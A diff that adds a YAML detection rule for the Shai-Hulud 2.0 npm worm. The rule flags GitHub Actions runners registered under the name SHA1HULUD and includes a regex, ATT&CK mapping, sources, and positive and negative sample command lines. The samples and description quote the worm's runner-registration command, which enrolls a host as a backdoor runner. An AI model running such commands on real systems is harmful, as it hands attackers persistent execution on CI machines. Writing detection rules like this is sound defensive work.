@@ -1,0 +1,39 @@
+id: WS-CI-004
+title: GitHub Actions runner registered or running with the worm's runner name
+severity: critical
+description: >-
+  Shai-Hulud 2.0 downloads the Actions runner into ~/.dev-env and runs
+  `RUNNER_ALLOW_RUNASROOT=1 ./config.sh --url https://github.com/<owner>/<repo> --unattended
+  --token <token> --name "SHA1HULUD"` (Datadog, quoted). Unit42's published hunting query matches
+  the unquoted form ` --name SHA1HULUD`. Both forms are matched. The worm runs config.sh with its
+  output suppressed, so look for it in process command lines rather than in job logs. A runner that
+  later picks up jobs reports the name in the Actions jobs API (runner_name, checked against a
+  public job).
+attack:
+  - id: T1102.002
+    name: "Web Service: Bidirectional Communication"
+    url: https://attack.mitre.org/techniques/T1102/002/
+data_source: >-
+  Process command lines from CI runners and developer machines (EDR or auditd execve), and the
+  runner_name field of GET /repos/{owner}/{repo}/actions/runs/{run_id}/jobs.
+iocs:
+  - data/iocs/workflows.json: SHA1HULUD
+pattern: '--name[ =]["'']?SHA1HULUD\b|"runner_name": ?"SHA1HULUD"'
+logic: |
+  Match pattern against process command lines and against jobs API responses. Also hunt for a
+  config.sh or run.sh process whose working directory is ~/.dev-env.
+false_positives:
+  - None expected. The name is specific to the worm.
+sources:
+  - https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/
+  - https://unit42.paloaltonetworks.com/npm-supply-chain-attack/
+  - https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack
+  - https://docs.github.com/en/rest/actions/workflow-jobs
+examples:
+  positive: |
+    RUNNER_ALLOW_RUNASROOT=1 ./config.sh --url https://github.com/example-user/q7k2m9x4v1b8n3c6z5 --unattended --token EXAMPLETOKEN --name "SHA1HULUD"
+    ./config.sh --url https://github.com/example-user/q7k2m9x4v1b8n3c6z5 --unattended --token EXAMPLETOKEN --name SHA1HULUD
+    {"id":1,"runner_name":"SHA1HULUD","runner_group_name":"Default"}
+  negative: |
+    ./config.sh --url https://github.com/example-org/tooling --unattended --token EXAMPLETOKEN --name build-07
+    {"id":2,"runner_name":"GitHub Actions 1019630356","runner_group_name":"GitHub Actions"}
